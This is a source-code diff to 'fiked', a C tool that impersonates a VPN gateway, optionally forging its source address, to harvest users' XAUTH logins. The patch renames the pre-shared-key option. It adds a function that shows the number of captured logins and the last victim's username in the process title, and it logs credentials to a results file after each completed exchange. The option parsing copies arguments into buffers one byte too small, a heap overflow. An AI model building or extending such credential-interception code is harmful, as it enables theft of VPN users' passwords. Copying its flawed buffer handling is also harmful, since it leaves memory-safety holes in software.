@@ -42,14 +42,14 @@
 char *self;
 void usage()
 {
-	fprintf(stderr, "Usage: %s [-rdqhV] -g <gateway> -s <secret> [-l <file>] [-L <file>]\n", self);
+	fprintf(stderr, "Usage: %s [-rdqhV] -g <gateway> -k <secret> [-l <file>] [-L <file>]\n", self);
 	fprintf(stderr, "\t-r\tuse raw socket: forge source address to match <gateway>\n");
 	fprintf(stderr, "\t-d\tdetach from tty and run as a daemon (implies -q)\n");
 	fprintf(stderr, "\t-q\tbe quiet, don't write anything to stdout\n");
 	fprintf(stderr, "\t-h\tprint help and exit\n");
 	fprintf(stderr, "\t-V\tprint version and exit\n");
 	fprintf(stderr, "\t-g gw\tVPN gateway address to impersonate\n");
-	fprintf(stderr, "\t-s psk\tshared secret aka. group password, pre shared key\n");
+	fprintf(stderr, "\t-k psk\tpre-shared key aka. group password, shared secret\n");
 	fprintf(stderr, "\t-l file\tappend results to credential log file\n");
 	fprintf(stderr, "\t-L file\tverbous logging to file instead of stdout\n");
 	exit(-1);
@@ -76,6 +76,26 @@ int duplicate(peer_ctx *ctx, datagram *dgm)
 }
 
 /*
+ * Signal status to outside by setting the process title.
+ * If ctx is set, logs credentials to results file.
+ */
+void status(config *cfg, peer_ctx *ctx)
+{
+	static uint32_t count = 0;
+	char *raw_txt = cfg->opt_raw ? "+raw" : "";
+	if(!ctx) {
+		log_printf(NULL, "fiked-%s started (%d/udp%s)", VERSION,
+			cfg->us->port, raw_txt);
+		setproctitle("[%d/udp%s] %d logins",
+			cfg->us->port, raw_txt, count);
+	} else {
+		setproctitle("[%d/udp%s] %d logins, last: %s@%s",
+			cfg->us->port, raw_txt, ++count,
+			ctx->xauth_username, ctx->ipsec_id);
+	}
+}
+
+/*
  * Option processing and main loop.
  */
 int main(int argc, char *argv[])
@@ -88,13 +108,13 @@ int main(int argc, char *argv[])
 	char *logfile = NULL;
 	int opt_quiet = 0;
 	int opt_daemon = 0;
-	while((ch = getopt(argc, argv, "g:s:l:L:drqhV")) != -1) {
+	while((ch = getopt(argc, argv, "g:k:l:L:drqhV")) != -1) {
 		switch(ch) {
 		case 'g':
 			cfg->gateway = malloc(strlen(optarg));
 			strcpy(cfg->gateway, optarg);
 			break;
-		case 's':
+		case 'k':
 			cfg->psk = malloc(strlen(optarg));
 			strcpy(cfg->psk, optarg);
 			break;
@@ -144,8 +164,7 @@ int main(int argc, char *argv[])
 	if(opt_daemon)
 		daemon(0, 0);
 
-	log_printf(NULL, "fiked-%s started (%d/udp%s)", VERSION, cfg->us->port,
-		cfg->opt_raw ? "+raw" : "");
+	status(cfg, NULL);
 
 	peer_ctx *peers = NULL;
 	peer_ctx *ctx = NULL;
@@ -162,6 +181,11 @@ int main(int argc, char *argv[])
 					reject);
 			} else {
 				ike_process_isakmp(ctx, ikp);
+				if(ctx->done) {
+					results_add(ctx);
+					status(ctx->cfg, ctx);
+					ctx->done = 0;
+				}
 			}
 			free_isakmp_packet(ikp);
 		}
